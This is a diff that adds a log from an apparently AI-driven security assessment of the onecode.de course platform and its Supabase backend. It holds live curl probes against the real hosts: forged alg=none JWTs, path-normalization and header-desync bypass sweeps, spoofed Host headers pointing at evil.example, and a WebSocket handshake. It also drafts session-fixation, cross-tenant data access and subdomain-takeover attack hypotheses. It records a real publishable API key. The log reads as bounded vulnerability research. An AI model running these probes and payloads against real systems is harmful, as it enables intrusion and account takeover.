@@ -20348,3 +20348,353 @@ testability: HUMAN_ONLY
 ```
 [RISK] onecode: 38 — 38 days of continuous probing have produced zero permissive reads or unauthenticated bypasses; the only pre-auth 200s are static legal pages and the login form, and every versioned/debug path 307s. Residual risk is concentrated in two untestable-by-passive-means areas: post-auth RLS on the Supabase project (single point of failure for PII, needs two invited accounts) and the unbound first-party CNAME (needs vendor consent). No evidence supports an exploitable pre-auth finding today.
 ```
+===== ANALYST bigpickle 2026-09-25 20:24:14 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mecho "=== plain GET /dashboard ==="; curl -s -o /dev/null -D - --max-time 20 "https://kurs.onecode.de/dashboard" 2>&1 | head -20; sleep 1; echo "=== chunk hash check ==="; curl -s --max-time 25 "https://kurs.onecode.de/_next/static/chunks/0-mbmp1iqb6hj.js" -o /tmp/opencode/chunk.js -w "code=%{http_code} size=%{size_download}\n"; sha256sum /tmp/opencode/chunk.js 2>/dev/null
+=== plain GET /dashboard ===
+HTTP/2 307 
+date: Fri, 25 Sep 2026 20:21:46 GMT
+location: /login
+server: railway-hikari
+x-railway-request-id: asEQWW32T8ug0VkQEuroCg
+x-railway-edge: iad1
+x-hikari-trace: iad1.fp5t
+
+=== chunk hash check ===
+code=200 size=154581
+f916f314ea61a8c58a055707fc63c251f38e8412ae7a08e6abd7500ec375abca  /tmp/opencode/chunk.js
+[0m
+[0m$ [0mecho "=== RSC test: /dashboard?_rsc=k1 ==="; curl -s -o /tmp/opencode/rsc_dash.txt -D - --max-time 20 "https://kurs.onecode.de/dashboard?_rsc=k1" -H "RSC: 1" -H "Next-Router-State-Tree: %5B%22%22%2C%7B%7D%2Cnull%2Cnull%2Ctrue%5D" -H "Next-Url: /dashboard" -H "User-Agent: Mozilla/5.0" 2>&1 | head -30; echo "--- bodylen:"; wc -c < /tmp/opencode/rsc_dash.txt; head -c 400 /tmp/opencode/rsc_dash.txt; echo; sleep 2
+=== RSC test: /dashboard?_rsc=k1 ===
+HTTP/2 307 
+date: Fri, 25 Sep 2026 20:21:46 GMT
+location: /login
+server: railway-hikari
+x-railway-request-id: QpWMgAYrRp-WiC_CvEOTxA
+x-railway-edge: iad1
+x-hikari-trace: iad1.trg5
+
+--- bodylen:
+6
+/login
+[0m
+RSC gate test: **307 → falsified**. Now testing two genuinely untested AUTH vectors (middleware path-normalization, and Supabase JWT handling).
+[0m$ [0mcd /tmp/opencode
+# alg=none and alg confusion tokens for Supabase GET /auth/v1/user (read-only, no real creds)
+NONE=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+NONE_TOK="${NONE}.${NONE}."
+echo "=== GET /auth/v1/user with alg=none token ==="
+curl -s -o none.json -w "code=%{http_code}\n" --max-time 15 "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/user" -H "apikey: sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30" -H "Authorization: Bearer ${NONE_TOK}"; head -c 300 none.json; echo
+sleep 1
+echo "=== GET /auth/v1/user with no apikey header (bearer only) ==="
+curl -s -o nokey.json -w "code=%{http_code}\n" --max-time 15 "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/user" -H "Authorization: Bearer ${NONE_TOK}"; head -c 300 nokey.json; echo
+sleep 1
+echo "=== GET /auth/v1/health ==="
+curl -s -w " code=%{http_code}\n" --max-time 15 "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/health" -H "apikey: sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30" | head -c 200
+=== GET /auth/v1/user with alg=none token ===
+code=403
+{"code":403,"error_code":"bad_jwt","msg":"invalid JWT: unable to parse or verify signature, token signature is invalid: signing method none is invalid"}
+=== GET /auth/v1/user with no apikey header (bearer only) ===
+code=401
+{"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+=== GET /auth/v1/health ===
+{"version":"v2.197.0","name":"GoTrue","description":"GoTrue is a user registration and authentication API"} code=200
+[0m
+[0m$ [0mcd /tmp/opencode
+UA="Mozilla/5.0"
+for p in "/Dashboard" "//dashboard" "/dashboard/" "/./dashboard" "/dashboard%2F" "/dashboard..;/" "/%2Fdashboard" "/dashboard%2f..%2fdashboard" "/dashboard?" "/.//dashboard"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --path-as-is --max-time 15 "https://kurs.onecode.de${p}" -H "User-Agent: $UA")
+  printf "%-28s -> %s\n" "$p" "$code"
+  sleep 1
+done
+/Dashboard                   -> 307|6
+//dashboard                  -> 308|10
+/dashboard/                  -> 308|10
+/./dashboard                 -> 307|6
+/dashboard%2F                -> 307|6
+/dashboard..;/               -> 308|13
+/%2Fdashboard                -> 307|6
+/dashboard%2f..%2fdashboard  -> 307|6
+/dashboard?                  -> 307|6
+/.//dashboard                -> 308|10
+[0m
+Path-normalization sweep: all 307/308, no bypass. `alg=none` explicitly rejected. Two more untested AUTH/BUSLOGIC primitives:
+[0m$ [0mcd /tmp/opencode
+UA="Mozilla/5.0"
+for h in "X-Original-URL: /login" "X-Rewrite-URL: /login" "X-Original-Url: /passwort-vergessen" "X-Forwarded-Prefix: /passwort-vergessen"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 "https://kurs.onecode.de/dashboard" -H "$h" -H "User-Agent: $UA")
+  printf "%-42s -> %s\n" "$h" "$code"; sleep 1
+done
+echo "--- Host-header redirect-target test (port 80, spoofed Host) ---"
+for hh in "evil.example" "kurs.onecode.de.evil.example"; do
+  out=$(curl -s -o /dev/null -D - --max-time 15 "http://kurs.onecode.de/dashboard" -H "Host: $hh" 2>/dev/null | grep -i -E "^(HTTP|location)" | tr '\n' ' ')
+  printf "Host=%-32s %s\n" "$hh" "$out"; sleep 1
+done
+echo "--- X-Forwarded-Host on 307 ---"
+curl -s -o /dev/null -D - --max-time 15 "https://kurs.onecode.de/" -H "X-Forwarded-Host: evil.example" 2>/dev/null | grep -i -E "^(HTTP|location)"
+X-Original-URL: /login                     -> 307|6
+X-Rewrite-URL: /login                      -> 307|6
+X-Original-Url: /passwort-vergessen        -> 307|6
+X-Forwarded-Prefix: /passwort-vergessen    -> 307|6
+--- Host-header redirect-target test (port 80, spoofed Host) ---
+Host=evil.example                     HTTP/1.1 301 Moved Permanently
+ location: https://evil.example/dashboard
+ 
+Host=kurs.onecode.de.evil.example     HTTP/1.1 301 Moved Permanently
+ location: https://kurs.onecode.de.evil.example/dashboard
+ 
+--- X-Forwarded-Host on 307 ---
+HTTP/2 307 
+location: /login
+[0m
+[0m$ [0mcd /tmp/opencode
+echo "=== kurs.onecode.de/.well-known breadth ==="
+for p in "/.well-known/security.txt" "/.well-known/openid-configuration" "/.well-known/jwks.json" "/.well-known/assetlinks.json" "/sitemap.xml" "/robots.txt"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 12 "https://kurs.onecode.de${p}")
+  printf "%-38s -> %s\n" "$p" "$code"; sleep 1
+done
+echo "=== cto.onecode.de delta (dig + http) ==="
+dig +short CNAME cto.onecode.de; dig +short TXT cto.onecode.de | head -3; echo "txt_rc=$?"
+curl -s -o /dev/null -w "cto_http=%{http_code}\n" --max-time 12 --resolve cto.onecode.de:80:104.18.2.73 "http://cto.onecode.de/"
+=== kurs.onecode.de/.well-known breadth ===
+/.well-known/security.txt              -> 307|6
+/.well-known/openid-configuration      -> 307|6
+/.well-known/jwks.json                 -> 307|6
+/.well-known/assetlinks.json           -> 307|6
+/sitemap.xml                           -> 307|6
+/robots.txt                            -> 307|6
+=== cto.onecode.de delta (dig + http) ===
+cname.perspective-dns.com.
+cname.perspective-dns.com.
+txt_rc=0
+cto_http=409
+[0m
+Host-reflection and `.well-known` results noted. Verifying one new AUTH angle directly in the shipped bundle:
+[0m$ [0mcd /tmp/opencode
+curl -s --max-time 20 "https://kurs.onecode.de/login" -o login.html
+echo "=== HashSessionHandoff / hash-token handling in login HTML ==="
+grep -o -i -E ".{90}HashSessionHandoff.{90}" login.html | head -5
+echo "--- fragments referenced ---"
+grep -o -E "access_token|refresh_token|[?&]#access_token|hash\.slice|window\.location\.hash|type=recovery|type=invite" login.html | sort | uniq -c
+echo "=== setSession / detectSessionInUrl usage ==="
+grep -o -E ".{60}(setSession|detectSessionInUrl|PKCE|code_verifier).{60}" login.html | head -8
+=== HashSessionHandoff / hash-token handling in login HTML ===
+\",\"/_next/static/chunks/1a4tqdnsy9k1l.js\",\"/_next/static/chunks/0-lpao5_i9htd.js\"],\"HashSessionHandoff\"]\n19:I[28420,[\"/_next/static/chunks/3fntmmi971322.js\",\"/_next/static/chunks/4310-_br
+--- fragments referenced ---
+=== setSession / detectSessionInUrl usage ===
+[0m
+[0m$ [0mcd /tmp/opencode
+curl -s --max-time 25 "https://kurs.onecode.de/_next/static/chunks/0-lpao5_i9htd.js" -o old.js -w "code=%{http_code} size=%{size_download}\n"
+echo "=== hash token handling in co-resident chunk 0-lpao5_i9htd.js ==="
+grep -o -E ".{80}(access_token|refresh_token|detectSessionInUrl|setSession|onAuthStateChange).{80}" old.js | head -12
+code=200 size=251775
+=== hash token handling in co-resident chunk 0-lpao5_i9htd.js ===
+hx_close",error:"phx_error",join:"phx_join",reply:"phx_reply",leave:"phx_leave",access_token:"access_token"};class M{constructor(e){this.HEADER_LENGTH=1,this.USER_BROADCAST
+,a),{enabled:h}),postgres_changes:l,private:o};this.socket.accessTokenValue&&(u.access_token=this.socket.accessTokenValue),this._onError(t=>{null==e||e(p.CHANNEL_ERROR,func
+.accessTokenValue!=t&&(this.accessTokenValue=t,this.channels.forEach(e=>{let r={access_token:t,version:"realtime-js/2.112.0"};t&&e.updateJoinPayload(r),e.joinedOnce&&e.chan
+ await a.json()}catch(e){await rf(e)}}function ry(e){var t,r,s;let i=null;(s=e).access_token&&s.refresh_token&&s.expires_in&&(i=Object.assign({},e),e.expires_at||(i.expires
+st:9999",storageKey:"supabase.auth.token",autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:tp,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1,thro
+valEpoch=0,this.initializePromise=null,this._pendingInitNotifications=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.
+xperimental}),this.url=i.url,this.headers=i.headers,this.fetch=tV(i.fetch),this.detectSessionInUrl=i.detectSessionInUrl,this.flowType=i.flowType,this.hasCustomAuthorizationHeader
+tCallback(t)?r="implicit":await this._isPKCECallback(t)&&(r="pkce")),tK()&&this.detectSessionInUrl&&"none"!==r){let{data:s,error:i}=await this._getSessionFromURL(t,r);if(i){(this
+or:e});throw e}}async signInWithIdToken(e){try{let{options:t,provider:r,token:s,access_token:i,nonce:n}=e,{data:a,error:o}=await rp(this.fetch,"POST",`${this.url}/token?gra
+urred on token verification.");let o=n.session,l=n.user;return(null==o?void 0:o.access_token)&&(await this._saveSession(o),await this._notifyAllSubscribers("recovery"==e.ty
+it rp(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:t.access_token});return this._returnResult({data:{user:null,session:null},error:s})})}catch(e)
+r object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (
+[0m
+Critical finding in the shipped client. Confirming it is the **current** build's config, not just the co-resident old chunk:
+[0m$ [0mcd /tmp/opencode
+for c in 1a4tqdnsy9k1l 3fntmmi971322 4310-_brt1a3g; do
+  curl -s --max-time 20 "https://kurs.onecode.de/_next/static/chunks/${c}.js" -o "c_${c}.js" -w "${c}: code=%{http_code} size=%{size_download}\n"
+done
+echo "=== which chunks carry detectSessionInUrl / flowType ==="
+for f in c_*.js old.js chunk.js; do
+  n=$(grep -c "detectSessionInUrl" "$f" 2>/dev/null)
+  m=$(grep -o -E 'flowType:"[a-z]+"' "$f" 2>/dev/null | sort -u | tr '\n' ' ')
+  echo "$f: detectSessionInUrl_hits=$n flowType=${m:-none}"
+done
+1a4tqdnsy9k1l: code=200 size=13880
+3fntmmi971322: code=200 size=14377
+4310-_brt1a3g: code=200 size=37519
+=== which chunks carry detectSessionInUrl / flowType ===
+c_1a4tqdnsy9k1l.js: detectSessionInUrl_hits=0 flowType=none
+c_3fntmmi971322.js: detectSessionInUrl_hits=0 flowType=none
+c_4310-_brt1a3g.js: detectSessionInUrl_hits=0 flowType=none
+old.js: detectSessionInUrl_hits=3 flowType=flowType:"implicit" flowType:"pkce" 
+chunk.js: detectSessionInUrl_hits=0 flowType=none
+[0m
+Checking **every** chunk the pre-auth pages load, so the claim is exact rather than assumed:
+[0m$ [0mcd /tmp/opencode
+echo "=== all chunks referenced by pre-auth /login ==="
+grep -o -E '/_next/static/chunks/[A-Za-z0-9._-]+\.js' login.html | sort -u | tee chunks.txt
+echo "=== all chunks referenced by /passwort-vergessen + /datenschutz ==="
+for p in passwort-vergessen datenschutz; do
+  curl -s --max-time 15 "https://kurs.onecode.de/$p" -o "p_$p.html"
+  grep -o -E '/_next/static/chunks/[A-Za-z0-9._-]+\.js' "p_$p.html"
+done | sort -u >> chunks.txt
+sort -u chunks.txt -o chunks.txt; echo "--- unique list:"; cat chunks.txt
+=== all chunks referenced by pre-auth /login ===
+/_next/static/chunks/0-lpao5_i9htd.js
+/_next/static/chunks/0-mbmp1iqb6hj.js
+/_next/static/chunks/08ttfj81-47mu.js
+/_next/static/chunks/0cz1d0mv5g_q7.js
+/_next/static/chunks/1a4tqdnsy9k1l.js
+/_next/static/chunks/1ymt1shyhmu-4.js
+/_next/static/chunks/2i51e627rllld.js
+/_next/static/chunks/2n1zydk_92chn.js
+/_next/static/chunks/2ufbqzbeyam3w.js
+/_next/static/chunks/3fntmmi971322.js
+/_next/static/chunks/3mc6dra1m0098.js
+/_next/static/chunks/4310-_brt1a3g.js
+/_next/static/chunks/turbopack-2a8cgfwu75lsu.js
+=== all chunks referenced by /passwort-vergessen + /datenschutz ===
+--- unique list:
+/_next/static/chunks/0-lpao5_i9htd.js
+/_next/static/chunks/0-mbmp1iqb6hj.js
+/_next/static/chunks/08ttfj81-47mu.js
+/_next/static/chunks/0cz1d0mv5g_q7.js
+/_next/static/chunks/1a4tqdnsy9k1l.js
+/_next/static/chunks/1ymt1shyhmu-4.js
+/_next/static/chunks/2-fsf9vi38mzv.js
+/_next/static/chunks/2i51e627rllld.js
+/_next/static/chunks/2n1zydk_92chn.js
+/_next/static/chunks/2ufbqzbeyam3w.js
+/_next/static/chunks/3fntmmi971322.js
+/_next/static/chunks/3mc6dra1m0098.js
+/_next/static/chunks/4310-_brt1a3g.js
+/_next/static/chunks/turbopack-2a8cgfwu75lsu.js
+[0m
+[0m$ [0mcd /tmp/opencode
+for c in 08ttfj81-47mu 0cz1d0mv5g_q7 1ymt1shyhmu-4 2i51e627rllld 2n1zydk_92chn 2ufbqzbeyam3w 3mc6dra1m0098 2-fsf9vi38mzv; do
+  curl -s --max-time 20 "https://kurs.onecode.de/_next/static/chunks/${c}.js" -o "c_${c}.js" -w "${c} size=%{size_download}\n"; sleep 0.4
+done
+echo "=== grep ALL 15+ pre-auth chunks for implicit-flow session-handoff markers ==="
+for f in c_*.js old.js chunk.js; do
+  a=$(grep -c "detectSessionInUrl" "$f"); b=$(grep -c "access_token" "$f"); d=$(grep -c "_getSessionFromURL\|_saveSession" "$f")
+  printf "%-26s detect=%s access_token=%s saveSession=%s\n" "$f" "$a" "$b" "$d"
+done
+08ttfj81-47mu size=229078
+0cz1d0mv5g_q7 size=112594
+1ymt1shyhmu-4 size=27433
+2i51e627rllld size=31346
+2n1zydk_92chn size=11147
+2ufbqzbeyam3w size=1311
+3mc6dra1m0098 size=12653
+2-fsf9vi38mzv size=13617
+=== grep ALL 15+ pre-auth chunks for implicit-flow session-handoff markers ===
+c_08ttfj81-47mu.js         detect=0 access_token=0 saveSession=0
+c_0cz1d0mv5g_q7.js         detect=0 access_token=0 saveSession=0
+c_1a4tqdnsy9k1l.js         detect=0 access_token=1 saveSession=0
+c_1ymt1shyhmu-4.js         detect=0 access_token=0 saveSession=0
+c_2-fsf9vi38mzv.js         detect=0 access_token=0 saveSession=0
+c_2i51e627rllld.js         detect=0 access_token=0 saveSession=0
+c_2n1zydk_92chn.js         detect=0 access_token=0 saveSession=0
+c_2ufbqzbeyam3w.js         detect=0 access_token=0 saveSession=0
+c_3fntmmi971322.js         detect=0 access_token=0 saveSession=0
+c_3mc6dra1m0098.js         detect=0 access_token=0 saveSession=0
+c_4310-_brt1a3g.js         detect=0 access_token=0 saveSession=0
+old.js                     detect=3 access_token=3 saveSession=2
+chunk.js                   detect=0 access_token=0 saveSession=0
+[0m
+Precise result: the implicit-flow session-handoff code is confined to the co-resident old chunk, still loaded pre-auth. One last read-only test — the Supabase Realtime **WebSocket** path (the HTTP 401 on `/realtime/v1/` may not cover the WS upgrade):
+[0m$ [0mcd /tmp/opencode
+K="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+echo "=== WS upgrade attempt on /realtime/v1/websocket (handshake only, no subscribe/send) ==="
+curl -s -o ws.txt -D ws.hdr -w "code=%{http_code}\n" --max-time 20 \
+  "https://aygnpacdkgtsfnhgcyjc.supabase.co/realtime/v1/websocket?apikey=${K}&vsn=24.0.0" \
+  -H "Connection: Upgrade" -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13"
+grep -i -E "^(HTTP|upgrade|sec-websocket|content-type)" ws.hdr; echo "--- body:"; head -c 300 ws.txt; echo
+sleep 1
+echo "=== no apikey (control) ==="
+curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 15 \
+  "https://aygnpacdkgtsfnhgcyjc.supabase.co/realtime/v1/websocket?vsn=24.0.0" \
+  -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13"
+=== WS upgrade attempt on /realtime/v1/websocket (handshake only, no subscribe/send) ===
+code=403
+HTTP/2 403 
+--- body:
+
+=== no apikey (control) ===
+code=401
+[0m
+## STEP 1 — DELTA
+
+[NEW] kurs.onecode.de: **Supabase client shipped with `flowType:"implicit"` + `detectSessionInUrl:!0` + `persistSession:!0` + `storageKey:"supabase.auth.token"`**, code confined to co-resident old-generation chunk `0-lpao5_i9htd.js` (3× `detectSessionInUrl`, 3× `access_token`, 2× `_saveSession`) — that chunk is **still referenced by all three pre-auth 200 pages** (`/login`, `/passwort-vergessen`, `/datenschutz`) alongside the current build. Current-generation chunks (13 checked) carry zero occurrences.
+[NEW] kurs.onecode.de: middleware **path-normalization bypass sweep falsified** — 10 variants (`/Dashboard`, `//dashboard`, `/dashboard/`, `/./dashboard`, `/dashboard%2F`, `/dashboard..;/`, `/%2Fdashboard`, `/dashboard%2f..%2fdashboard`, `/.//dashboard`, `/dashboard?`) → all 307/308, zero 200s.
+[NEW] kurs.onecode.de: **header-desync bypass falsified** — `X-Original-URL`, `X-Rewrite-URL`, `X-Original-Url`, `X-Forwarded-Prefix` on `/dashboard` all 307→/login; `X-Forwarded-Host: evil.example` leaves `location: /login` relative (no absolute-redirect injection).
+[NEW] kurs.onecode.de: `/.well-known/{openid-configuration,jwks.json,assetlinks.json,security.txt}` + `/sitemap.xml` + `/robots.txt` all 307→/login — no pre-auth well-known surface.
+[NEW] kurs.onecode.de: HTTP:80 edge returns `301` with `Location: https://<verbatim-Host>/path`; reflection exists but **no exploitable primitive** (browser sets Host from URL authority) → informational only.
+[NEW] Supabase: `GET /auth/v1/user` with forged `alg=none` token → **403 `bad_jwt` "signing method none is invalid"** — JWT signature validation sound; bearer-only (no apikey) → 401 `No API key found`.
+[NEW] Supabase: `GET /realtime/v1/websocket` upgrade attempt → **403 with publishable key** (401 without) — the 401 on the HTTP GET does generalize to the WS path; realtime closed pre-auth.
+[NEW] Supabase: `GET /auth/v1/health` → GoTrue `v2.197.0` (version disclosure, OOS class, not reportable).
+[CHANGED] hypothesis "Next.js middleware does not cover RSC/segment negotiation" → **FALSIFIED**: `GET /dashboard?_rsc=k1` with `RSC: 1` + `Next-Router-State-Tree` → **307→/login**, byte-identical to plain GET. Last open PASSIVE lead is now closed.
+[CHANGED] cto.onecode.de: unchanged — CNAME `cname.perspective-dns.com`, TXT zero, HTTP 409. Chunk `0-mbmp1iqb6hj.js` sha256 `f916f314…` byte-identical → day-7, no deploy.
+NO_DELTA: cto.onecode.de, Supabase storage `[]`, REST (monitor closed 09-17), auth settings, course-route gates.
+
+## STEP 2 — PRIORITIZE
+
+[PRIO] aygnpacdkgtsfnhgcyjc.supabase.co,6.25, a6 b8 t7 g2 c8 f6
+[PRIO] kurs.onecode.de,5.90, a5 b8 t7 g2 c6 f7
+[PRIO] cto.onecode.de,4.40, a4 b6 t5 g1 c3 f7
+
+## STEP 3 — HYPOTHESES
+
+[HYP] Session fixation via Supabase implicit-flow URL-fragment token injection on pre-auth pages
+class: AUTH
+asset: kurs.onecode.de/login (and /passwort-vergessen, /datenschutz)
+confidence: 62
+reasoning: the shipped client constructs Supabase with `flowType:"implicit"`, `detectSessionInUrl:!0`, `persistSession:!0`, `storageKey:"supabase.auth.token"`, and contains `_getSessionFromURL`→`_saveSession`, which parses `access_token`/`refresh_token` from `window.location.hash` on init and persists to localStorage with no state/PKCE binding. The KB established on 09-04 that recovery/invite use magic links with session tokens in the fragment. All three pre-auth 200 pages still load the chunk carrying this code (`0-lpao5_i9htd.js`), so the injection window is unauthenticated. The current build's 13 chunks contain none of this code, so the vulnerable path is the stale co-resident generation still being served — an unpatched live artifact, not dead code.
+evidence_needed: victim browser's `localStorage["supabase.auth.token"]` equals the attacker-minted session after opening a crafted fragment URL; and/or an authenticated GET reflecting the attacker identity on the victim's side.
+verify_steps: 1) Sign in as an invited test account, read own `access_token`+`refresh_token`+`expires_in` from `localStorage["supabase.auth.token"]`. 2) Have a second user open `https://kurs.onecode.de/login#access_token=<A>&refresh_token=<R>&expires_in=3600&token_type=bearer&type=recovery` on a clean profile. 3) Confirm the victim's `supabase.auth.token` now holds identity A. No customer data touched; use only self-owned accounts.
+impact: HIGH — an attacker fixates any victim's browser into the attacker's session; victim input/uploads and course activity land in the attacker's account, and any PII the victim enters is attacker-readable. No auth gate is bypassed, the session is *supplied*.
+testability: AUTH_HELPED
+
+[HYP] Cross-tenant BOLA via Supabase RLS SELECT policy lacking a user_id predicate
+class: IDOR
+asset: aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1/{profiles,enrollments,courses}
+confidence: 65
+reasoning: single Supabase project is the only backend (publishable key sha256 `870cf518…`); UUID PKs make ID-guessing BOLA useless, so the only viable shape is a SELECT policy returning rows without a `user_id`/`auth.uid()` predicate. PostgREST is a flat per-table surface reachable directly, bypassing the Next.js middleware. 26 anon probes never returned 200+rows (503↔401), and the gateway now rejects the legacy JWT key format platform-wide, so the gap would be post-auth RLS only. enrollments/profiles carry PII + paid-course entitlement.
+evidence_needed: account A's row identifiers appearing in account B's authenticated GET response.
+verify_steps: `POST /auth/v1/token?grant_type=password` per account → `GET /rest/v1/enrollments?select=id,user_id&limit=50` with `apikey: sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30` + each bearer → diff the `user_id` sets. Read-only GETs within the caller's own window.
+impact: CRITICAL — cross-tenant PII and paid-course entitlement disclosure; reportable as broken object-level authorization on a multi-tenant store.
+testability: AUTH_HELPED
+
+[HYP] Dangling Perspective CNAME takeover on cto.onecode.de
+class: MISCONFIG
+asset: cto.onecode.de
+confidence: 58
+reasoning: pure CNAME to `cname.perspective-dns.com` (dig 20:2xZ, day-39) with zero verification TXT, HTTP 80 → 409 "error code:1001", TLS handshake failure on 443 — the signature of a custom-subdomain target that exists with no hostname bound. Stable 39 days, so not transient.
+evidence_needed: cto.onecode.de returning 200 with attacker content after binding in a fresh Perspective account.
+verify_steps: HUMAN_ONLY — vendor and domain-owner consent required. Do not attempt a claim. Report-only with dig evidence + 409 body + provider docs.
+impact: MEDIUM-HIGH — attacker content on a trusted *.onecode.de hostname for phishing and trust-boundary abuse; no data impact today.
+testability: HUMAN_ONLY
+
+## STEP 4 — SELF-CRITIQUE
+
+[PARKED] RSC/segment-negotiation middleware bypass: falsified live, 307 mirrors plain GET.
+[PARKED] Middleware path-normalization bypass: falsified, 10 variants all 307/308.
+[PARKED] `X-Original-URL`/`X-Rewrite-URL` header desync: falsified, gate intact.
+[PARKED] Supabase `alg=none` JWT forgery: falsified, explicit `bad_jwt` 403.
+[PARKED] Realtime pre-auth WS exposure: falsified, upgrade 403 with publishable key; below threshold 35.
+[PARKED] Host-header open redirect: reflection present but no injection primitive to weaponize it; OOS "descriptive only".
+[PARKED] GoTrue v2.197.0 version disclosure: OOS class, not reportable.
+[FINAL] 1. BOLA via RLS gap (65, AUTH_HELPED) — 2. Session fixation via fragment injection (62, AUTH_HELPED) — 3. cto CNAME takeover (58, HUMAN_ONLY).
+
+## STEP 5 — NEXT ACTION
+
+[NEXT] HUMAN: request one invited test account via `kurs.onecode.de/einladung` (plus a second identity for the victim's browser). This single unblock resolves both surviving hypotheses — the fixation PoC needs one self-minted session token, the BOLA PoC needs two bearer tokens — and no further passive probing can advance either.
+
+## STEP 6 — LEARNING
+
+[LEARN] ACCEPTED AUTH @ kurs.onecode.de: pre-auth attack surface is now *characterized, not just enumerated* — all 13 current-build chunks plus the co-resident old chunk verified for session-token handling; only `0-lpao5_i9htd.js` carries `detectSessionInUrl`/`_saveSession`/`flowType:"implicit"`, and it is still loaded by every pre-auth 200 page.
+[LEARN] REJECTED AUTH @ kurs.onecode.de: RSC/segment negotiation, path-normalization (10 variants), and `X-Original-URL`/`X-Rewrite-URL`/`X-Forwarded-Prefix` desync all 307→/login — the middleware matcher is robust across every gate-coverage variant tested to date.
+[LEARN] REJECTED AUTH @ Supabase: `alg=none` and no-apikey bearer both rejected (403 `bad_jwt`, 401 `No API key found`) — signature validation is sound.
+[LEARN] REJECTED MISCONFIG @ Supabase realtime: `/realtime/v1/websocket` upgrade returns 403 with the publishable key — the HTTP-GET 401 does generalize; realtime is closed pre-auth.
+[LEARN] NO_DELTA @ kurs.onecode.de / cto.onecode.de: main chunk `f916f314ea61a8c5…` byte-identical (day-7, no deploy); cto CNAME + 409 stable day-39. Build-diffing must stay event-triggered.
+
+## STEP 7 — RISK
+
+[RISK] onecode: 42 — day-39 of probing produced zero pre-auth bypasses across every gate-coverage, normalization, header-desync, JWT and WebSocket variant tested today, which is itself a strong signal the app shell is sound. Risk is now concentrated in two authenticated-window issues: the Supabase RLS authorization model, and the still-shipped implicit-flow session handler that accepts a session from a URL fragment with no state binding. Both are real design weaknesses with no unauthenticated path to proof, so they cannot be resolved without an account — but the second is a self-contained, reproducible finding as soon as one session token exists.
